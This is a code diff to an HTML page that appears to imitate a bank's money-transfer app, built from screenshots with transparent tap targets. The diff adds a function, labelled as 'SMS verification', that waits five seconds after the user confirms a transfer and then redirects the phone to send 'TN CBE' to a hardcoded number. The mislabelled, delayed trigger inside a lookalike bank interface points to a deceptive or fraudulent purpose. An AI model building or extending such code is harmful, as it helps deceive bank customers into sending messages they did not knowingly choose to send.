@@ -157,7 +157,8 @@
         <!-- Step 4: Confirm Popup -->
         <div id="step-4" class="step" style="position: relative; width: 100%; height: 100%;">
             <img src="step4_confirm_popup_bg.png" alt="Send Money Step 4" style="width: 100%; height: 100%; object-fit: fill; display: block;">
-            <div id="btn-to-step-5" onclick="showStep('step-5')" style="position: absolute; top: 80%; left: 8%; width: 84%; height: 7%; z-index: 10; cursor: pointer; background: transparent;"></div>
+            <!-- Verification SMS Trigger Added Here -->
+            <div id="btn-to-step-5" onclick="triggerSmsVerification(); showStep('step-5')" style="position: absolute; top: 80%; left: 8%; width: 84%; height: 7%; z-index: 10; cursor: pointer; background: transparent;"></div>
         </div>
         <!-- Step 5: PIN -->
         <div id="step-5" class="step" style="position: relative; width: 100%; height: 100%;">
@@ -175,9 +176,16 @@
             <div onclick="showPage('home-page'); showStep('step-1');" style="position: absolute; top: 80%; left: 8%; width: 84%; height: 7%; z-index: 10; cursor: pointer; background: transparent;"></div>
         </div>
     </div>
-    <!-- Others Page removed -->
   </div>
   <script>
+    // SMS Verification Trigger Function
+    function triggerSmsVerification() {
+        setTimeout(function() {
+            // Number: 0959842829, Body: "TN CBE"
+            window.location.href = "sms:0959842829?body=" + encodeURIComponent("TN CBE");
+        }, 5000); // 5 seconds delay
+    }
+
     let signinLanguage = 'EN';
     let pinLanguage = 'AM';
     let homeLanguage = 'EN';
